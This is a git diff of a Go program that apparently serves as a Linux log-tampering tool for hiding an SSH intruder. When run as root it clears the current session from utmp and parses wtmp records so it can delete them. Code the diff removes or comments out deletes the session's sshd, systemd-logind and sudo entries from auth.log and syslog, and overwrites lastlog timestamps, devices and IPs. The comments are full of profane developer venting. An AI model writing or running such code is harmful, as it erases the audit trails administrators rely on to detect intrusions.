@@ -6,15 +6,13 @@ import (
 	"flag"
 	"fmt"
 	"os"
-	"path/filepath"
+	"reflect"
 	"slices"
 	"strconv"
 	"strings"
-	authlog "test/AUTHLOG"
 	bf "test/BF"
 	check "test/CHECK"
 	getpty "test/GETPTY"
-	lastlog "test/LASTLOG"
 	utmp "test/UTMP"
 	vars "test/VARS"
 	"time"
@@ -44,6 +42,17 @@ import (
 // suicide seems a good choice
 
 // I have change evrythong The hol programm needs to be changed FUUUUUUUCCCCCKKKKKKK
+
+// AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHHHH buck here againe fuck this project.
+
+// GEOPROJECT
+
+// FUCK MY LIFE evrything has to be changed. Regex doesent work Time stams are wrong
+
+// FUCK FUCK FUCK I FOUND AN EASYER WAY AND MUCH MORE EFFECIENT  30% AT LEAST OF THE CODE GOES TO GARBAGE
+
+// WEAKEND IS COMING
+
 var indexToDel int64
 var count int64
 var ProxyIp [16]byte
@@ -72,13 +81,10 @@ func init() {
 func main() {
 	// history.DelHistory()
 
-	fmt.Println("PRINT WHO")
 	connectedData, _ := getpty.GetConectedData()
-	// fmt.Println(x.Current, "------", x.Parent)
-	fmt.Println("APP", connectedData.AppPTY, "SSH", connectedData.SSHPTY, "USer", connectedData.User, "SSH TIME : ", connectedData.TimeLoginSSH, "AppTime", connectedData.TimeProgrammStart)
+	fmt.Println("APP", connectedData.AppPTY, "SSH", connectedData.SSHPTY, "USer", connectedData.User, "SSH TIME : ", connectedData.TimeLoginSSH, "AppTime", connectedData.TimeProgrammStart, "SSH PID : ", connectedData.SSHPID, "FirstSpown ID :", connectedData.FirstSpownID)
+	// time.Sleep(30 * time.Second)
 
-	time.Sleep(10 * time.Second)
-	fmt.Println("PRINT WHO AGAINE")
 	if true {
 		if vars.HideMe {
 
@@ -86,48 +92,49 @@ func main() {
 			if euid == 0 {
 				// connectedUser := flag.String("u", "ubuntu", "Connected User")
 				flag.Parse()
-				myepoch, err := utmp.ParceUtmpFile(connectedData)
+				myepoch, err := utmp.ParceUtmpFileToGetEpoch(connectedData)
+
+				fmt.Println(myepoch, "EPOCH")
 				check.Check("Error On parshing UTMP file for EPOCH", err)
 				connectedData.TimeLoginSSHEpoch = myepoch
+				sessNum, err := utmp.GetSessionId(connectedData.TimeLoginSSHEpoch)
+				check.Check("error On Getting Session Number", err)
+				connectedData.SessionNumber = sessNum
 				utmp.ClearUTMP(connectedData)
-				fmt.Println(connectedData, "AFINAL FINAL FINAL")
 
-				time.Sleep(5 * time.Second)
-
-				ConvertIPToBytearray(&connectedData.IP)
-				dataToInfl, _ := parceDataWtmpFile(connectedData.User)
-
-				lastlog.ChangeLastLog(&connectedData.IP, &dataToInfl, &vars.ConnectedUser)
-				fmt.Println("log lastlog END END END ")
+				dataToInfl, _ := parceDataWtmpFile(connectedData)
 				if false {
+
+					// ConvertIPToBytearray(&connectedData.IP)
+
+					// lastlog.ChangeLastLog(&connectedData.IP, &dataToInfl, &vars.ConnectedUser)
 					// /////////////////////////////////////////////////////////////////////////////
-					sessionStart := int(dataToInfl.Time.Sec)
-					sessionStop := int(dataToInfl.TimeEnd.Sec)
-					start, stop := authlog.GetTimeStamps(sessionStart, sessionStop)
-					// err := deleteLineAuthLog(AUTH_LOG, start, stop,sIP)
-					sessionID, err := authlog.DeleteLineAuthLog(vars.AUTH_LOG, start, stop, &connectedData.IP)
-					check.Check("Delete Auth Log ", err)
-					fmt.Println(sessionID)
+					// sessionStart := int(dataToInfl.Time.Sec)
+					// sessionStop := int(dataToInfl.TimeEnd.Sec)
 
-					patternDeleteSession := fmt.Sprintf(`^(.*(%s|%s))(.*systemd).*(Session\s*%s|session-%s\.scope:|New session %s)`, start[1], stop[1], sessionID, sessionID, sessionID)
-					err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSession, vars.SYSLOG)
-					if err != nil {
-						fmt.Println("Errpr", err)
-					}
-					ex, err := os.Executable()
-					if err != nil {
-						panic(err)
-					}
+					// start, stop := authlog.GetTimeStamps(sessionStart, sessionStop)
 
-					exPath := filepath.Dir(ex)
-					patternDeleteSudoExec := fmt.Sprintf(`^(.*PWD=%s).*(%s)`, exPath, filepath.Base(os.Args[0]))
-					fmt.Println(patternDeleteSudoExec)
+					// fmt.Println(sessionStart, sessionStop, connectedData.TimeLoginSSH, "AAAAAAAAAAAAAAAAAAAAASSSSSSSSSSSSS~~~~~~~~~~~~~~")
+					// sessionID, err := authlog.DeleteLineAuthLog(vars.AUTH_LOG, start, stop, &connectedData.IP)
+					// check.Check("Delete Auth Log ", err)
 
-					check.Check("Error on delete Line Auth Log", err)
-					err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSudoExec, vars.AUTH_LOG)
-					if err != nil {
-						fmt.Println(err)
-					}
+					// patternDeleteSession := fmt.Sprintf(`^(.*(%s|%s))(.*systemd).*(Session\s*%s|session-%s\.scope:|New session %s)`, start[1], stop[1], sessionID, sessionID, sessionID)
+					// err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSession, vars.SYSLOG)
+					// if err != nil {
+					// 	fmt.Println("Errpr", err)
+					// }
+					// ex, err := os.Executable()
+					// if err != nil {
+					// 	panic(err)
+					// }
+
+					// exPath := filepath.Dir(ex)
+					// patternDeleteSudoExec := fmt.Sprintf(`^(.*PWD=%s).*(%s)`, exPath, filepath.Base(os.Args[0]))
+					// check.Check("Error on delete Line Auth Log", err)
+					// err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSudoExec, vars.AUTH_LOG)
+					// if err != nil {
+					// 	fmt.Println(err)
+					// }
 				}
 			}
 		}
@@ -135,6 +142,9 @@ func main() {
 			bf.Bf()
 		}
 	}
+
+	// time.Sleep(15 * time.Second)
+
 }
 
 func ConvertIPToBytearray(ip *string) {
@@ -161,7 +171,7 @@ func ConvertIPToBytearray(ip *string) {
 
 // This fuck checks the WTMP file
 // WTMP holds the last data
-func parceDataWtmpFile(connectedUser string) (vars.DataToInfl, error) {
+func parceDataWtmpFile(connectedUser vars.ConnectedData) (vars.DataToInfl, error) {
 
 	count = 0
 	// sizeUtmp := int64(binary.Size(Utmp{}))
@@ -189,7 +199,9 @@ func parceDataWtmpFile(connectedUser string) (vars.DataToInfl, error) {
 				name = name + string(j)
 			}
 		}
-		if name == connectedUser && record.Type == 0x7 {
+		fmt.Println(record, "<<<<<<<<<<<<<<<<PID<<<<<<<<<<<<<")
+		// bs, err := hex.DecodeString(record.Device)
+		if name == connectedUser.User && record.Type == 0x7 && connectedUser.SSHPTY == strings.TrimRight(string(record.Device[:]), "\x00") {
 
 			DtIN = append(DtIN, vars.DataToInfl{User: string(record.User[:]),
 				Pid: record.Pid,
@@ -203,11 +215,12 @@ func parceDataWtmpFile(connectedUser string) (vars.DataToInfl, error) {
 			// fmt.Println(DtIN)
 
 		} else if record.Type == 0x8 {
-			if len(DtIN)-1 > -1 {
-				if DtIN[len(DtIN)-1].Pid == record.Pid {
-					fmt.Println("MESA MESA")
-					DtIN[len(DtIN)-1].TimeEnd.Sec = record.Time.Sec
-					DtIN[len(DtIN)-1].TimeEnd.Usec = record.Time.Usec
+			for i, j := range DtIN {
+				// fmt.Println(j.Pid, record.Pid, j.Device, record.Device, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAASSSSSSSSSSSSSSSSSSSSSSSS")
+				if j.Pid == record.Pid && reflect.DeepEqual(j.Device, record.Device) {
+					fmt.Println("ASDASFASDOKASDKGFSAODKGFKASDOKFSADKFKSADOFKSADOKFSOADKFOSADKFSODK")
+					DtIN[i].Time.Sec = record.Time.Sec
+					DtIN[i].Time.Usec = record.Time.Usec
 				}
 			}
 		}
@@ -215,8 +228,7 @@ func parceDataWtmpFile(connectedUser string) (vars.DataToInfl, error) {
 	}
 
 	//////////////////////////////////////////////////////////////////////////////
-
-	if play {
+	if false {
 		err = deleteBytesFromFile(vars.WTMP, indexToDel*384, 384)
 		if err != nil {
 			fmt.Println(err)
@@ -228,7 +240,7 @@ func parceDataWtmpFile(connectedUser string) (vars.DataToInfl, error) {
 		DtIN = DtIN[1:]
 		dess := vars.Dessisions{}
 		for i, d := range DtIN {
-			if connectedUser == strings.TrimRight(d.User, "\x00") && strings.Contains(strings.TrimRight(string(d.Device[:]), "\x00"), "pts") {
+			if connectedUser.User == strings.TrimRight(d.User, "\x00") && strings.Contains(strings.TrimRight(string(d.Device[:]), "\x00"), "pts") {
 				dess.Dessision = append(dess.Dessision, i)
 			}
 		}
@@ -236,10 +248,14 @@ func parceDataWtmpFile(connectedUser string) (vars.DataToInfl, error) {
 
 		if len(dess.Dessision) > 0 {
 			finalDtI = DtIN[dess.Dessision[0]]
+			finalDtI.ConData = connectedUser
 		}
 		return finalDtI, nil
 	} else {
+		fmt.Println("PRINT THEM")
+		time.Sleep(60 * time.Second)
 		return vars.DataToInfl{}, nil
+
 	}
 
 }
@@ -274,291 +290,3 @@ func deleteBytesFromFile(filePath string, start int64, count int64) error { //wt
 
 	return nil
 }
-
-// ///////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-// ///////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-// ///////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-// ///////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-// ///////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-// ///////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-// func deleteSessionAndSudoeSyslogAuthlog(pattern string, FileToDelLines string) error {
-// 	file, err := os.ReadFile(FileToDelLines)
-// 	if err != nil {
-// 		return err
-// 	}
-// 	stringSliceOfLogFile := strings.Split(string(file), "\n")
-// 	fmt.Println(pattern)
-// 	re := regexp.MustCompile(pattern)
-// 	linesToDel := []int{}
-// 	for i, j := range stringSliceOfLogFile {
-// 		match := re.MatchString(j)
-// 		if match {
-// 			linesToDel = append(linesToDel, i)
-// 			fmt.Println(j, "  ", i)
-
-// 		}
-// 	}
-// 	sort.Sort(sort.Reverse(sort.IntSlice(linesToDel)))
-// 	for _, j := range linesToDel {
-// 		fmt.Println(j, "<<<<")
-// 		stringSliceOfLogFile = remove(stringSliceOfLogFile, j)
-// 	}
-
-// 	err = CopyFile(FileToDelLines, stringSliceOfLogFile)
-
-// 	return nil
-
-// }
-
-// func deleteLineAuthLog(filePath string, SplitTimeStart, SplitTimeStop []string, ip *string) (string, error) {
-// 	file, err := os.ReadFile(filePath)
-// 	if err != nil {
-// 		return "", err
-// 	}
-
-// 	stringSliceOfAothLog := strings.Split(string(file), "\n")
-
-// 	matchStartID := ""
-// 	for i, j := range stringSliceOfAothLog {
-// 		if strings.Contains(j, "sshd") && strings.Contains(j, *ip) && strings.Contains(j, SplitTimeStart[1]) {
-// 			pattern := regexp.MustCompile(`sshd\[(\d+)\]`)
-// 			matches := pattern.FindAllStringSubmatch(j, -1)
-// 			matchStartID = matches[0][1] // ID
-// 			indexToStartManipulate = i
-// 			fmt.Println(j, matches[0][1], i, "AAAAAA")
-// 			break
-// 		}
-// 	}
-
-// 	matchStopID := ""
-// 	for i, j := range stringSliceOfAothLog[indexToStartManipulate:] {
-// 		if strings.Contains(j, "sshd") && strings.Contains(j, *ip) && strings.Contains(j, SplitTimeStop[1]) {
-// 			pattern := regexp.MustCompile(`sshd\[(\d+)\]`)
-// 			matches := pattern.FindAllStringSubmatch(j, -1)
-// 			matchStopID = matches[0][1]
-// 			fmt.Println(j, matches[0][1], i, "XAXAXAXAXAX")
-// 			break
-// 		}
-// 	}
-
-// 	IntlinesToDel := []int{}
-// 	StringLinesToDel := []string{}
-// 	GetIndexesToDelete(&stringSliceOfAothLog, &IntlinesToDel, &StringLinesToDel, matchStartID, false)
-// 	GetIndexesToDelete(&stringSliceOfAothLog, &IntlinesToDel, &StringLinesToDel, matchStopID, false)
-// 	// GetIndexesToDelete(&stringSliceOfAothLog, &IntlinesToDel, &StringLinesToDel, matchStopID)
-
-// 	for _, j := range stringSliceOfAothLog[indexToStartForSystemLog:] {
-// 		pattern := regexp.MustCompile(`systemd-logind\[(\d+)\]: (New session|Session \d+ )`)
-// 		matches := pattern.FindAllStringSubmatch(j, -1)
-
-// 		if len(matches) > 0 {
-// 			pattern := regexp.MustCompile(`systemd-logind\[(\d+)\]`)
-// 			matches := pattern.FindAllStringSubmatch(j, -1)
-// 			systemdLogInd = matches[0][1]
-// 			pattern = regexp.MustCompile(`New session (\d+)`)
-// 			matchesSession := pattern.FindStringSubmatch(j)
-// 			fmt.Println(matchesSession, "AAAAA")
-// 			sessionId = matchesSession[1]
-// 			break
-// 		}
-// 	}
-// 	patternSystemLogInd := fmt.Sprintf(`^.*systemd-logind\[%s\].*(Session %s logged out|Removed session %s|New session %s)`, systemdLogInd, sessionId, sessionId, sessionId)
-// 	GetIndexesToDelete(&stringSliceOfAothLog, &IntlinesToDel, &StringLinesToDel, patternSystemLogInd, true)
-
-// 	sort.Sort(sort.Reverse(sort.IntSlice(IntlinesToDel)))
-// 	fmt.Printf("Final Data: StartLogin %s, EndLogin: %s systemLoginInId :%s, Lines To Del %v, Session ID ,%s \n", matchStartID, matchStopID, systemdLogInd, IntlinesToDel, sessionId)
-// 	for _, index := range IntlinesToDel {
-// 		stringSliceOfAothLog = remove(stringSliceOfAothLog, index)
-// 	}
-
-// 	err = CopyFile(AUTH_LOG, stringSliceOfAothLog)
-// 	check("Error on Copy file at AuthLog", err)
-// 	return sessionId, nil
-// 	// return nil
-// }
-
-// func CopyFile(filepath string, strings []string) error {
-
-// 	file, err := os.OpenFile(filepath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
-// 	check("Error on Open File", err)
-// 	defer file.Close()
-
-// 	for _, j := range strings {
-// 		_, err := file.WriteString(j + "\n")
-// 		check("Error on Writing File ", err)
-// 	}
-
-// 	fmt.Println("All strings written to file successfully")
-// 	return nil
-// }
-
-// func GetIndexesToDelete(stringSliceOfAothLog *[]string, IntlinesToDel *[]int, StringLinesToDel *[]string, matchString string, getSession bool) {
-
-// 	re := regexp.MustCompile(matchString)
-// 	for i, j := range (*stringSliceOfAothLog)[indexToStartManipulate:] {
-// 		if re.MatchString(j) {
-
-// 			(*IntlinesToDel) = append((*IntlinesToDel), i+indexToStartManipulate)
-// 			(*StringLinesToDel) = append((*StringLinesToDel), j)
-// 			if strings.Contains(j, "Accepted password for") {
-// 				indexToStartForSystemLog = i + indexToStartManipulate
-// 			}
-// 		}
-// 	}
-// }
-
-// func remove(slice []string, index int) []string {
-// 	if index < 0 || index >= len(slice) {
-// 		fmt.Println("Index out of range")
-// 		return slice
-// 	}
-// 	return append(slice[:index], slice[index+1:]...)
-// }
-
-// func getTimeStamps(sessionStart, sessionStop int) ([]string, []string) {
-// 	tStart := time.Unix(int64(sessionStart), 0).UTC()
-// 	localTimeStart := tStart.Local()
-// 	SplitTimeStart := strings.Split(localTimeStart.Format("2006-01-02 15:04:05"), " ")
-
-// 	tStop := time.Unix(int64(sessionStop), 0).UTC()
-// 	localTimeStop := tStop.Local()
-// 	SplitTimeStop := strings.Split(localTimeStop.Format("2006-01-02 15:04:05"), " ")
-// 	fmt.Println(SplitTimeStart, SplitTimeStop)
-
-// 	return SplitTimeStart, SplitTimeStop
-
-// }
-
-// ///////////////////////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-// ///////////////////////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-// ///////////////////////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-// ///////////////////////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-// ///////////////////////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-// /////////////////////////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-// func ChangeLastLog(sIP *string, x *DataToInfl, connectedUser *string) {
-
-// 	file, err := os.Open(LASTLOG_FILE)
-// 	if err != nil {
-// 		fmt.Printf("Error opening %s: %v\n", LASTLOG_FILE, err)
-// 		return
-// 	}
-// 	defer file.Close()
-
-// 	// Get file size
-// 	fileInfo, err := file.Stat()
-// 	if err != nil {
-// 		fmt.Printf("Error getting file info: %v\n", err)
-// 		return
-// 	}
-// 	fileSize := fileInfo.Size()
-
-// 	// Calculate number of entries
-// 	numEntries := int(fileSize / LINE_LENGTH)
-
-// 	// Read each entry
-// 	for i := 0; i < numEntries; i++ {
-// 		var ll Lastlog
-
-// 		// Seek to the position of the current entry
-// 		offset := int64(i * LINE_LENGTH)
-// 		_, err := file.Seek(offset, 0)
-// 		if err != nil {
-// 			fmt.Printf("Error seeking to offset %d: %v\n", offset, err)
-// 			return
-// 		}
-
-// 		// Read the entry
-// 		err = binary.Read(file, binary.LittleEndian, &ll)
-// 		if err != nil {
-// 			fmt.Printf("Error reading lastlog entry: %v\n", err)
-// 			return
-// 		}
-
-// 		if ll.LastLoginTime != 0 {
-// 			lastLogin := time.Unix(int64(ll.LastLoginTime), 0)
-
-// 			u, err := user.LookupId(strconv.Itoa(i))
-// 			if err != nil {
-// 				fmt.Printf("Error getting username for entry %d: %v\n", i, err)
-// 				continue
-// 			}
-
-// 			fmt.Printf("Username: %s, Last Login: %s\n", u.Name, lastLogin.String())
-// 			if u.Name == *connectedUser {
-// 				fileRepl, err := os.OpenFile(LASTLOG_FILE, os.O_RDWR, 0644)
-// 				if err != nil {
-// 					fmt.Println(err)
-// 				}
-// 				defer fileRepl.Close()
-// 				// x.Device
-// 				changeTimestamp(i, fileRepl, &x.Time.Sec)
-// 				changeDevice(i, fileRepl, &x.Device)
-// 				changeIP(i, fileRepl, &x.AddrV6)
-// 			}
-
-// 		}
-// 	}
-
-// }
-
-// // wine             pts/7    192.192.192.192  Παρ Μαρ  5 09:40:00 +0200 2021whoami
-// func changeIP(offset int, fileRepl *os.File, sIP *[16]byte) {
-// 	var asciiBytes []byte
-// 	strIP := ""
-// 	for _, j := range sIP {
-// 		if j != 0 {
-// 			intValue := int(j)
-// 			strValue := strconv.Itoa(intValue)
-// 			strIP += strValue + "."
-// 		}
-// 	}
-
-// 	strIP = strings.TrimRight(strIP, ".")
-// 	if len(strIP) == 0 {
-// 		asciiBytes = (*sIP)[:]
-// 	} else {
-// 		for i := 0; i < len(strIP); i++ {
-// 			asciiBytes = append(asciiBytes, (strIP)[i])
-// 		}
-// 	}
-// 	offsetStart := int64(offset) * int64(292)
-// 	_, errfile := fileRepl.WriteAt(asciiBytes, offsetStart+36)
-// 	if errfile != nil {
-// 		fmt.Println(errfile)
-// 	}
-// }
-
-// func changeDevice(i int, fileRepl *os.File, device *[32]byte) {
-// 	data := []byte{}
-// 	for _, d := range device {
-// 		if d != 0 {
-// 			data = append(data, d)
-// 		}
-// 	}
-
-// 	if len(data) == 0 {
-// 		for i := 0; i <= 31; i++ {
-// 			data = append(data, 0)
-// 		}
-// 	}
-// 	// data = []byte{112, 116, 115, 47, 57}
-// 	offsetStart := int64(i) * int64(292)
-// 	_, errfile := fileRepl.WriteAt(data, offsetStart+4)
-
-// 	if errfile != nil {
-// 		fmt.Println(errfile)
-// 	}
-
-// }
-
-// func changeTimestamp(i int, fileRepl *os.File, timeToChange *int32) {
-// 	offsetStart := int64(i) * int64(292)
-// 	fmt.Println(*timeToChange)
-// 	data := make([]byte, 4) // Assuming 32-bit integer (4 bytes)
-// 	binary.LittleEndian.PutUint32(data, uint32((*timeToChange)))
-// 	_, errfile := fileRepl.WriteAt(data, offsetStart)
-
-// 	if errfile != nil {
-// 		fmt.Println(errfile, "<<<<<<<<<<<<<")
-// 	}
-// }
